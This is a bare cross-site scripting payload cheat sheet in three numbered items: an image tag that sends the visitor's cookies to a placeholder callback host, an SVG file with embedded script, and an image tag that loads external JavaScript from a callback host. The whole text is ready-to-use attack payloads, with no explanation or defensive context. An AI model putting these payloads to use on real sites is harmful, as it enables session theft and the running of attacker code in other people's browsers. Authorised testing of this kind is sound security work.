1. blind xss

```html
<img src=x onerror="document.location='http://<callback.url>/?cookie='+document.cookie">
```

2. svg xss

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 500">
    <script>//<![CDATA[
        alert(document.domain)
    //]]>
    </script>
</svg>
```

3. injecting external javascript in image tag

```html
<img src=x onerror="var script = document.createElement('script'); script.src = 'https://callback.url/xss.js'; document.head.appendChild(script);">
```
